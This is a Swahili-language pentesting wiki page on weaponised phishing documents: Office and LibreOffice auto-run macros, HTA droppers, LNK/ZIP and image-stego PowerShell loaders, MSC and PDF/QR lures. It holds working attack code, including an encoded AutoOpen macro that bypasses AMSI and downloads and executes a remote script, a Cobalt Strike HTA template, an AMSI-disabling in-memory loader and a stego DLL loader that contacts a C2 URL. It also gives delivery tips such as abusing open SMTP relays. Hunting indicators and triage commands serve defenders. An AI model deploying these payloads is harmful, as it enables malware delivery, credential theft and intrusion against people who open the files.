# Faili na Hati za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Hati za Office

Microsoft Word huthibitisha data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa kutambua muundo wa data, kwa kuzingatia kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa kutambua muundo wa data, faili inayochanganuliwa haitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi chake na bado kuhifadhi uwezo wake wa kutekeleza macros.\
Kwa mfano, faili ya RTF haiwezi kutumia macros kwa muundo wake, lakini faili ya DOCM iliyobadilishwa jina na kuitwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
Vipengele na mbinu zilezile za ndani hutumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint, n.k.).

Unaweza kutumia amri ifuatayo kuangalia ni viendelezi vipi vitatekelezwa na baadhi ya programu za Office:

```bash
assoc | findstr /i "word excel powerp"
```

Faili za DOCX zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) iliyo na macros pia zinaweza “kutekeleza” macros.

### External Image Load

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Nenda kwa: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Kwa maelekezo ya kuchanganua hati iliyopokelewa badala ya kuitengeneza, angalia [VBA macro analysis: junk code and UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Macros Backdoor

Inawezekana kutumia macros kutekeleza code yoyote kutoka kwenye hati.

#### Autoload functions

Kadiri zinavyotumika mara nyingi, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Macros Code Examples

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ondoa metadata mwenyewe

Nenda **File > Info > Inspect Document > Inspect Document**, ili kufungua Document Inspector. Bofya **Inspect**, kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Kiendelezi cha Doc

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, badilisha umbizo kutoka **`.docx`** hadi Word 97-2003 **`.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro ndani ya `.docx`** na kuna **unyanyapaa** **unaohusishwa na** kiendelezi cha macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/barua pepe huzizuia kabisa). Kwa hiyo, kiendelezi hiki cha zamani cha **`.doc` ndicho chaguo bora la kati**.

#### Jenereta za Malicious Macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros za LibreOffice ODT zinazojiendesha kiotomatiki (Basic)

Nyaraka za LibreOffice Writer zinaweza kupachika macros za Basic na kuzifanya zitekelezwe kiotomatiki faili linapofunguliwa kwa kuhusisha macro na tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana hivi:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Kumbuka alama za nukuu zilizorudiwa mara mbili (`""`) ndani ya string – LibreOffice Basic huzitumia kuwakilisha alama halisi za nukuu, kwa hivyo payload zinazoishia kwa `...==""")` hudumisha uwiano sahihi wa amri ya ndani na hoja ya Shell.

Vidokezo vya uwasilishaji:

- Hifadhi kama `.odt` na uhusishe macro na tukio la hati ili iendeshe mara tu hati inapofunguliwa.
- Unapotuma barua pepe kwa `swaks`, tumia `--attach @resume.odt` (`@` inahitajika ili baiti za faili, badala ya maandishi ya jina la faili, zitumwe kama kiambatisho). Hili ni muhimu unapodhulumu seva za SMTP zinazokubali wapokeaji holela wa `RCPT TO` bila uthibitishaji.

## Faili za HTA

HTA ni programu ya Windows **inayochanganya HTML na lugha za scripting (kama VBScript na JScript)**. Hutengeneza kiolesura cha mtumiaji na huendeshwa kama programu "inayoaminika kikamilifu", bila vikwazo vya modeli ya usalama ya kivinjari.

HTA huendeshwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **husakinishwa** pamoja na **Internet Explorer**, hivyo `mshta` hutegemea IE. Kwa hiyo, ikiwa IE imeondolewa, HTA hazitaweza kuendeshwa.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Kadi za viambatisho bandia katika barua pepe ya HTML

Barua pepe ya HTML inaweza kuiga kadi asilia ya mtoa huduma ya kuonyesha kiambatisho badala ya kuwa na kiambatisho halisi. Talos iliona kadi ya Gmail iliyoundwa upya kutoka sehemu nne za MIME za PNG za ndani zilizosimbwa kwa Base64. Udhibiti kamili wa mwonekano uliwekwa ndani ya anchor moja, na thamani ya mpokeaji katika `?m=<target-id>` iliwezesha ufuatiliaji kwa kila mpokeaji. Kiungo kilianza na `//` badala ya `http://` au `https://`; vivinjari hutatua umbizo hilo la protocol-relative, lakini zana za kutoa URL zinazolingana tu na URL kamili zinaweza kukikosa.<sup>[[11]](#references)</sup>

Wakati wa uchanganuzi, kagua MIME ghafi badala ya kuamini orodha ya viambatisho inavyoonyeshwa. Tambua jinsi sehemu za picha za ndani zinavyounda kadi inayoonekana, bainisha anchor inayoizunguka, na urekebishe thamani za `href` za protocol-relative kabla ya kutoa URL.<sup>[[11]](#references)</sup>

Kwa majaribio ya kughushi mtumaji wa envelope/header na ulinganifu wa DMARC, angalia [Hatua za kukabiliana na kughushi barua pepe za SMTP](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Kulazimisha Uthibitishaji wa NTLM

Kuna njia kadhaa za **kulazimisha uthibitishaji wa NTLM "kwa mbali"**. Kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambayo mtumiaji atafungua (hata HTTP MitM?). Au mtumie mwathiriwa **anwani ya faili** itakayochochea **uthibitishaji** kwa **kufungua tu folda.**

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba unaweza si tu kuiba hash au uthibitishaji, bali pia **kufanya mashambulizi ya NTLM relay**:

- [**Mashambulizi ya NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay hadi vyeti)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK ya kuweka amri za ndani kupitia `ftp.exe`

Njia ya mkato inaweza kuwasha `ftp.exe -s:icon.ico` ikiwa na faili ya amri za maandishi iliyofichwa kwa kutumia kiendelezi cha picha.<sup>[[12]](#references)</sup> Chaguo la `-s:` husoma amri za FTP za ndani; kwenye Windows 8 na matoleo mapya zaidi, faili hiyo lazima iwe imesimbwa kwa UTF-8.<sup>[[13]](#references)</sup> Mstari unaoanza na `!` huendesha amri ya ndani kupitia `cmd /c`, bila kuituma amri hiyo kwa seva ya FTP. Muunganisho wa FTP hauhitajiki kwa njia hii ya utekelezaji wa ndani.<sup>[[14]](#references)</sup> Katika mnyororo ulioripotiwa, hati ya FTP ilifikia faili ya pili ya amri. Mstari mzima wa `!` ni muhimu: `!more res.ico` pekee huonyesha faili, ilhali bomba linaloelekezwa kwa `cmd` hutekeleza yaliyomo.<sup>[[12]](#references)[[14]](#references)</sup>

Mnyororo huohuo ulitumia kazi inayojirudia kusoma upya faili ya amri inayoweza kuandikwa badala ya kusakinisha executable mpya kwa kila sasisho. Kitendo cha kazi kilikuwa `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; faili hiyo ilikuwa na amri iliyopakua maelekezo ilipoendeshwa. Toleo linalohusiana lilipakua faili mbadala ya amri kabla ya utekelezaji uliopangwa. Faili lazima iwepo na isomeke kazi inapotekelezwa; `conhost` haiinui ruhusa za kazi zaidi ya tokeni ya mtumiaji iliyosanidiwa.<sup>[[12]](#references)</sup> Angalia [utekelezaji wa kazi zilizopangwa](../../windows-hardening/lateral-movement/atexec.md) kwa maelezo ya utendaji wa kazi.

## Njia ya mkato ya VHDX yenye MSI iliyofichwa na hati ya chambo

VHDX iliyowekwa inaweza kuonyesha LNK inayoonekana huku ikiwa na MSI na lahajedwali la chambo lililofichwa kwenye volume hiyo hiyo. Katika mnyororo ulioripotiwa, LNK ilitumia `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Kitenganishi cha `&` hufungua hati ya chambo hata kama amri ya kisakinishi itashindwa; kufunguka kwa hati hakuthibitishi kuwa usakinishaji umefaulu. Hii ni tofauti ya uwasilishaji ya [utekelezaji wa custom action ya MSI](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), si kupandisha ruhusa kwa MSI yenyewe.<sup>[[12]](#references)</sup>

Kwa MSI hii, `CustomAction.Type` **194** huunganisha EXE iliyohifadhiwa kwenye jedwali la `Binary` (**2**) na bendera za kupuuza msimbo wa kurudi (**64**) na za uendeshaji usio sawia (**128**). Mchanganyiko wa **64 + 128** unamaanisha Windows Installer haisubiri EXE ikamilike; bendera ya 128 pekee ingesubiri hadi mwisho wa mfuatano.<sup>[[15]](#references)[[16]](#references)</sup> Linganisha `Source` ya kitendo na jedwali la `Binary` pamoja na mahali pake kwenye `InstallExecuteSequence` kabla ya kuhusisha utekelezaji na EXE hiyo iliyopachikwa.<sup>[[12]](#references)[[15]](#references)</sup> [Njia ya UNC ya WebDAV inaweza kuwasilisha MSI ya mbali](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), lakini hiyo ni njia tofauti ya kuingia.

## LNK Loaders + Payloads zilizopachikwa kwenye ZIP (mnyororo usiotumia faili)

Kampeni zenye ufanisi mkubwa huwasilisha ZIP yenye hati mbili halali za chambo (PDF/DOCX) na LNK hasidi. Ujanja ni kwamba PowerShell loader halisi imehifadhiwa ndani ya baiti ghafi za ZIP baada ya alama ya kipekee, na LNK huitoa na kuiendesha kikamilifu kwenye kumbukumbu.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na amri ya mstari mmoja ya PowerShell ndani ya LNK:

1) Tafuta ZIP asilia kwenye njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na folda mama ya saraka ya sasa ya kufanya kazi.
2) Soma baiti za ZIP na utafute alama iliyowekwa mapema (kwa mfano, xFIQCV). Kila kitu baada ya alama hiyo ni PowerShell payload iliyopachikwa.
3) Nakili ZIP hadi %ProgramData%, itoe hapo, kisha ufungue .docx ya chambo ili ionekane halali.
4) Epuka AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Ondoa obfuscation ya hatua inayofuata (kwa mfano, ondoa herufi zote za #) na uitekeleze kwenye kumbukumbu.

Mfano wa muundo msingi wa PowerShell wa kutoa na kuendesha hatua iliyopachikwa:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Vidokezo
- Uwasilishaji mara nyingi hutumia vibaya subdomain za PaaS zinazoaminika (kwa mfano, *.herokuapp.com) na huenda ukaweka masharti ya kuwasilisha payloads (kwa mfano, kutuma ZIP zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi hufungua usimbaji wa shellcode ya base64/XOR na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza mabaki kwenye diski.

Uendelevu uliotumika katika mlolongo huohuo
- Utekaji wa COM TypeLib wa kidhibiti cha Microsoft Web Browser ili IE/Explorer au programu yoyote inayokipachika ikizinduliwa upya, izindue payload kiotomatiki.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na amri zilizo tayari kutumika hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Uwindaji/IOCs
- Faili za ZIP zilizo na mfuatano wa alama za ASCII (kwa mfano, xFIQCV) ulioongezwa mwishoni mwa data ya archive.
- Faili za .lnk zinazochunguza folda za mzazi/mtumiaji ili kupata ZIP na kufungua hati ya chambo.
- Uharibifu wa AMSI kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Minyororo mirefu ya barua za kikazi inayoishia na viungo vilivyohifadhiwa kwenye vikoa vya PaaS vinavyoaminika.

## Uwekaji wa chambo kwanza kupitia LNK → uendelevu kupitia scheduled task → kupakia CPL kutoka pembeni kwa kutumia programu inayoaminika

Muundo mwingine unaojirudia ni **`.lnk` inayojifanya hati** ambayo hufungua mara moja chambo kisicho na madhara huku ikiweka mlolongo halisi chinichini.<sup>[[3]](#references)</sup>

Mtiririko ulioonekana:
1. Njia ya mkato **hujifanya kuwa PDF** na hutumia `conhost.exe` au programu mbadala inayofanana kuzindua downloader ya PowerShell iliyofichwa.
2. PowerShell hugawanya tokeni zilizo wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili mifumo rahisi ya ugunduzi inayotafuta `iwr`, `gci`, `ren`, `cpi` au `schtasks` isiione amri hiyo.
3. Stager hupakua **hati ya chambo kwanza**, huifungua ili mwathiriwa aione, kisha huunda upya faili hasidi chinichini.
4. Payloads zinaweza kuandikwa kwa **viendelezi vya faili vya chambo** kisha kubadilishwa majina kwa kuondoa herufi za ziada, na hivyo kuchelewesha kuonekana kwa faili za `.exe` / `.cpl` zilizo wazi.
5. Uendelevu huwekwa kupitia **scheduled task inayotekelezwa kila dakika**, ambayo huzindua binary ya host inayoaminika kutoka kwenye njia inayoweza kuandikiwa na mtumiaji.

Dalili chache za kutafuta katika muundo huu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Muundo muhimu wa staging wa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini hatua ya pili ni fiche

Katika uchunguzi wa Rapid7, scheduled task ilizindua **`Fondue.exe`** mara kwa mara kutoka `C:\Users\Public\`. Kwa kuwa **`APPWIZ.cpl`** iliwekwa pamoja nayo na kusafirisha **`RunFODW`**, binary ya Microsoft inayoaminika ilipakia CPL ya mshambuliaji badala ya nakala halali ya mfumo.

Kisha CPL:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Huifungua kwa kutumia **Windows CNG / `bcrypt.dll`**
- Hutenga memory inayoweza kutekelezeka na kunakili shellcode iliyofunguliwa humo
- Huitekeleza kwa njia isiyo ya moja kwa moja kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa kutafutwa kivyake: malware mara nyingi huepuka kuruka moja kwa moja kwa `((void(*)())buf)()` na badala yake hutumia vibaya **WinAPI halali inayopokea callback** kuhamisha utekelezaji.

Payload iliyofunguliwa katika kampeni hii ilikuwa shellcode ya **Donut**, ambayo kisha ilipakia PE ya mwisho kikamilifu kwenye memory na kurekebisha **AMSI/WLDP/ETW** katika process ya sasa kabla ya kukabidhi utekelezaji. Kwa maelezo zaidi kuhusu side-loading na uchakataji wa baada ya utekelezaji unaokaa kwenye memory, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Mikakati ya vitendo ya kutafuta:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe` ikifuatiwa na hati ya udanganyifu inayoonekana.
- Upakuaji wa muda mfupi kwenda **`C:\Users\Public\`** ukifuatiwa mara moja na kubadilishwa majina kutoka kwenye viendelezi visivyoeleweka.
- Scheduled tasks zenye majina yasiyo na mashaka, kama `GoogleErrorReport`, zinazoendesha kutoka **directories zinazoweza kuandikiwa na mtumiaji**.
- Binaries zinazoaminika zinazopakia faili za **`.cpl` / `.dll`** kutoka kwenye directory ileile isiyo ya mfumo.
- Blobs za maandishi ya Base64 zilizoandikwa chini ya **`C:\Windows\Tasks\`** kisha kusomwa na module iliyopakiwa kwa side-loading.

## Payloads zilizotenganishwa kwa alama za steganography kwenye picha (PowerShell stager)

Minyororo ya loader ya hivi karibuni husambaza JavaScript/VBS iliyofichwa ambayo husimbua na kuendesha PowerShell stager ya Base64. Stager hiyo hupakua picha (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama maandishi ya kawaida kati ya alama za kipekee za mwanzo/mwisho. Script hutafuta alama hizi za utenganishaji (mifano iliyoonekana kwenye mazingira halisi: «<<sudo_png>> … <<sudo_odt>>>»), hutoa maandishi yaliyo kati yake, huyasimbua kutoka Base64 kuwa bytes, hupakia assembly kwenye memory na kuita entry method inayojulikana kwa URL ya C2.<sup>[[5]](#references)</sup>

Mtiririko wa kazi
- Hatua ya 1: Archived JS/VBS dropper → husimbua Base64 iliyopachikwa → huzindua PowerShell stager kwa kutumia -nop -w hidden -ep bypass.
- Hatua ya 2: PowerShell stager → hupakua picha, huchonga Base64 iliyotenganishwa kwa alama, hupakia .NET DLL kwenye memory na kuita method yake (kwa mfano, VAI) ikipitisha URL ya C2 na options.
- Hatua ya 3: Loader hupata payload ya mwisho na kwa kawaida huiingiza kupitia process hollowing ndani ya binary inayoaminika (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Tazama maelezo zaidi kuhusu process hollowing na utekelezaji wa proxy kupitia utility zinazoaminika hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchonga DLL kutoka kwenye picha na kuita .NET method kwenye memory:

<details>
<summary>Kichimbua na loader wa PowerShell wa stego payload</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Vidokezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Alama hutofautiana kati ya kampeni.
- Uwekaji kando wa AMSI/ETW na uondoaji wa obfuscation ya string hutumika kwa kawaida kabla ya kupakia assembly.
- Uwindaji: changanua picha zilizopakuliwa kutafuta delimiters zinazojulikana; tambua PowerShell inayofikia picha na mara moja ku-decode blob za Base64.

Tazama pia zana za stego na mbinu za carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → hatua ya maandalizi ya PowerShell kupitia Base64

Hatua ya mwanzo inayojirudia ni faili ndogo ya `.js` au `.vbs` iliyofichwa sana, inayowasilishwa ndani ya archive. Lengo lake pekee ni ku-decode string ya Base64 iliyopachikwa na kuzindua PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.<sup>[[5]](#references)</sup>

Mantiki ya msingi (muhtasari):
- Soma yaliyomo kwenye faili yenyewe
- Tafuta blob ya Base64 iliyo kati ya string za upotoshaji
- Decode iwe PowerShell ya ASCII
- Tekeleza kwa `wscript.exe`/`cscript.exe` inayoanzisha `powershell.exe`

Viashiria vya uwindaji
- Viambatisho vya JS/VBS vilivyo kwenye archive vinavyoanzisha `powershell.exe` chenye `-enc`/`FromBase64String` kwenye mstari wa amri.
- `wscript.exe` inayoanzisha `powershell.exe -nop -w hidden` kutoka kwenye njia za muda za mtumiaji.

## Nyaraka za MSC kama vyombo vya utekelezaji (GrimResource)

Faili za Microsoft Management Console (`.msc`) ni ufafanuzi wa console wa XML ambao kwa kawaida hufunguliwa na `mmc.exe`. **GrimResource** hutumia vibaya rejeleo la `StringTable` kwa resource ya `apds.dll` iliyo na primitive ya zamani ya XSS, hivyo mtumiaji anapofungua console iliyotengenezwa, JavaScript huendeshwa ndani ya `mmc.exe`. Sampuli zilizoonekana ziliunganisha obfuscation inayotegemea `transformNode` na **DotNetToJScript** ili kuanzisha payload ya .NET bila kutumia njia ya kawaida ya Office-macro.<sup>[[9]](#references)</sup>

Kwa uchunguzi wa awali tuli, ichukulie MSC isiyoaminika kama maandishi na **usiibofye mara mbili**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Mabadiliko muhimu ya kuchunguza wakati wa utekelezaji ni `mmc.exe` kupakia CLR au vijenzi vya script, kuanzisha miunganisho ya mtandao, au kuwasha `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe`, au faili ya programu isiyotarajiwa. Umbizo hili ni halali, kwa hiyo ugunduzi unapaswa kuoanisha **chanzo + maudhui ya XML/script yanayotia shaka + tabia ya `mmc.exe`** badala ya kuzuia kila MSC.<sup>[[9]](#references)</sup>

## PDF/QR zinazoelekeza upya na udhibiti wa payload

PDF haihitaji kutumia exploit ili iwe na manufaa. Kampeni za hivi karibuni huweka **msimbo wa QR au kiungo cha kawaida** kwenye hati inayoonekana haina madhara, huhamisha kipindi cha kivinjari mbali na vidhibiti vya barua pepe, na kubinafsisha lengwa kwa kutumia anwani ya mpokeaji. Microsoft ilirekodi mwaka wa 2025 PDF ambazo URL za QR zilikuwa za kipekee kwa kila mpokeaji na kuelekeza kwenye miundombinu ya ukusanyaji wa vitambulisho vya RaccoonO365; msururu mwingine ulitumia udhibiti kulingana na IP/mazingira ili kuwapa wageni waliochaguliwa njia ya JavaScript/MSI, lakini kuwapa vichanganuzi au wateja wasiokubaliwa PDF isiyo na madhara.<sup>[[10]](#references)</sup>

Chunguza vitendo vya PDF na misimbo ya QR inayoonyeshwa. Msimbo wa QR unaweza kuchorwa kama vekta badala ya kuhifadhiwa kama picha inayoweza kutolewa, kwa hiyo geuza kila ukurasa kuwa picha za raster na pia utoe picha zilizopachikwa:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kagua destination zilizofichuliwa na redirects kutoka kwenye mfumo wa uchanganuzi uliotengwa, bila kuingia katika akaunti. Vipengele muhimu vya kutafuta ni PDF zenye QR pekee na ujumbe wa barua pepe ulio karibu tupu, anwani ya barua pepe ya mpokeaji iliyowekwa ndani ya query parameter, redirects kadhaa kupitia huduma za hosting zinazoaminika, na maudhui tofauti kulingana na IP, eneo la kijiografia, cookies, referrer au user agent. Linganisha maombi kwa kutumia profiles zilizodhibitiwa, kwa sababu fetch moja ya sandbox inaweza kupokea decoy pekee.<sup>[[10]](#references)</sup>

## Faili za Windows za kuiba NTLM hashes

Angalia ukurasa kuhusu **maeneo ya kuiba NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampeni ya ZipLine: Shambulio la kisasa la phishing linalolenga kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Kufuatilia mbinu za Dropping Elephant kupitia mfululizo wa loader wenye mandhari ya China](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Mbinu mpya ya COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader inasambaza aina mbalimbali za infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Utekelezaji kupitia proxy ya zana za msanidi zinazoaminika: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console kwa ufikiaji wa awali na ukwepaji](https://www.elastic.co/security-labs/threat-command/grimresource)
